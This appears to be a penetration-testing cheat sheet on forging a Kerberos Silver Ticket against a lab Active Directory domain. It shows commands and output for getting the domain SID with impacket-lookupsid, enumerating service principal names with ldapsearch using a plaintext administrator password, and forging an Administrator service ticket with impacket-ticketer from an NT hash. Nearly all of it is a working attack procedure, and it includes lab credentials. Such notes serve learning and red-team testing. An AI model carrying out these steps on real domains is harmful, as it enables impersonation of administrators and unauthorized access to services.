# KRB5
## Silver Ticket
```bash
# get domain SID
impacket-lookupsid contoso.org/Administrator@192.168.68.179
# Impacket v0.12.0.dev1 - Copyright 2023 Fortra
#
# Password:
# [*] Brute forcing SIDs at 192.168.68.179
# [*] StringBinding ncacn_np:192.168.68.179[\pipe\lsarpc]
# [*] Domain SID is: S-1-5-21-245103785-2483314120-3684157271
# ...




ldapsearch -LLL -x -H ldap://192.168.68.179 -D 'Administrator@contoso.org' -w 'win2016-cli-P@$swd1!' -b 'dc=contoso,dc=org'
# dn: CN=WIN-NUU0DPB1BVC,OU=Domain Controllers,DC=contoso,DC=org
# objectClass: top
# objectClass: person
# objectClass: organizationalPerson
# objectClass: user
# objectClass: computer
# cn: WIN-NUU0DPB1BVC
# distinguishedName: CN=WIN-NUU0DPB1BVC,OU=Domain Controllers,DC=contoso,DC=org
# ...
# serverReferenceBL: CN=WIN-NUU0DPB1BVC,CN=Servers,CN=Default-First-Site-Name,CN
#  =Sites,CN=Configuration,DC=contoso,DC=org
# dNSHostName: WIN-NUU0DPB1BVC.contoso.org
# rIDSetReferences: CN=RID Set,CN=WIN-NUU0DPB1BVC,OU=Domain Controllers,DC=conto
#  so,DC=org
# servicePrincipalName: RPC/bd05490f-2c96-4f89-9201-c530cfa7eda4._msdcs.contoso.
#  org
# servicePrincipalName: GC/WIN-NUU0DPB1BVC.contoso.org/contoso.org
# servicePrincipalName: ldap/WIN-NUU0DPB1BVC/CONTOSO
# servicePrincipalName: ldap/bd05490f-2c96-4f89-9201-c530cfa7eda4._msdcs.contoso
#  .org
# servicePrincipalName: ldap/WIN-NUU0DPB1BVC.contoso.org/CONTOSO
# servicePrincipalName: ldap/WIN-NUU0DPB1BVC
# servicePrincipalName: ldap/WIN-NUU0DPB1BVC.contoso.org
# servicePrincipalName: ldap/WIN-NUU0DPB1BVC.contoso.org/ForestDnsZones.contoso.
#  org
# servicePrincipalName: ldap/WIN-NUU0DPB1BVC.contoso.org/DomainDnsZones.contoso.
#  org
# servicePrincipalName: ldap/WIN-NUU0DPB1BVC.contoso.org/contoso.org
# servicePrincipalName: E3514235-4B06-11D1-AB04-00C04FC2DCD2/bd05490f-2c96-4f89-
#  9201-c530cfa7eda4/contoso.org
# servicePrincipalName: DNS/WIN-NUU0DPB1BVC.contoso.org
# servicePrincipalName: HOST/WIN-NUU0DPB1BVC.contoso.org/CONTOSO
# servicePrincipalName: HOST/WIN-NUU0DPB1BVC.contoso.org/contoso.org
# servicePrincipalName: HOST/WIN-NUU0DPB1BVC/CONTOSO
# servicePrincipalName: Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/WIN-NUU0DPB1BV
#  C.contoso.org
# servicePrincipalName: TERMSRV/WIN-NUU0DPB1BVC
# servicePrincipalName: TERMSRV/WIN-NUU0DPB1BVC.contoso.org
# servicePrincipalName: WSMAN/WIN-NUU0DPB1BVC
# servicePrincipalName: WSMAN/WIN-NUU0DPB1BVC.contoso.org
# servicePrincipalName: RestrictedKrbHost/WIN-NUU0DPB1BVC
# servicePrincipalName: HOST/WIN-NUU0DPB1BVC
# servicePrincipalName: RestrictedKrbHost/WIN-NUU0DPB1BVC.contoso.org
# servicePrincipalName: HOST/WIN-NUU0DPB1BVC.contoso.org
# ...



# you can use any online NTLM hash generator to obtain -nthash if you only have password

# generate TGS that is signed with service account's kerberos key (derived from -nthash) 
# for the target user "Administrator" and target SPN MSSQLSvc and apply 512 group to that user
### DONT FORGET TO FIX THE CLOCK SKEW
sudo ntpdate 192.168.68.64 && sudo impacket-ticketer -nthash fd72ca83b31d63f864440afa274bbd0c -domain-sid S-1-5-21-245103785-2483314120-3684157271 -domain contoso.org -spn HOST/WIN-KML6TP4LOOL Administrator
# 2025-02-20 02:31:38.877088 (+1100) +0.101192 +/- 0.000193 192.168.68.64 s1 no-leap
# Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

# [*] Creating basic skeleton ticket and PAC Infos
# [*] Customizing ticket for contoso.org/Administrator
# [*]     PAC_LOGON_INFO
# [*]     PAC_CLIENT_INFO_TYPE
# [*]     EncTicketPart
# /usr/share/doc/python3-impacket/examples/ticketer.py:843: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
# encRepPart['last-req'][0]['lr-value'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
# [*]     EncTGSRepPart
# [*] Signing/Encrypting final ticket
# [*]     PAC_SERVER_CHECKSUM
# [*]     PAC_PRIVSVR_CHECKSUM
# [*]     EncTicketPart
# [*]     EncTGSRepPart
# [*] Saving ticket in Administrator.ccache
# Ticket cache: FILE:Administrator.ccache
# Default principal: Administrator@CONTOSO.ORG
```

